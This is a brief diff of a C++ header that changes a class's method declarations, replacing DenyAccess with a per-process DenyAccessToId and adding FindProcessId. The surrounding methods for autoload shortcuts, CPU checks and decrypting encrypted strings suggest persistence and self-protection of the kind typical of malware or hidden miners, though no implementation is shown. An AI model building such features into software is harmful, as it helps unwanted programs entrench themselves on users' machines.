@@ -24,7 +24,8 @@ public:
 	void Autoload(string Name, string Path);
 	int getCPU();
 	char* UnEnc(char *enc, char *key, DWORD encLen);
-	BOOL DenyAccess();
+	BOOL DenyAccessToId(DWORD pId);
+	DWORD FindProcessId(const std::wstring& processName);
 	void createAutoLoadShortcut();
 	bool IsProcessRunning(const wchar_t *processName);
 };
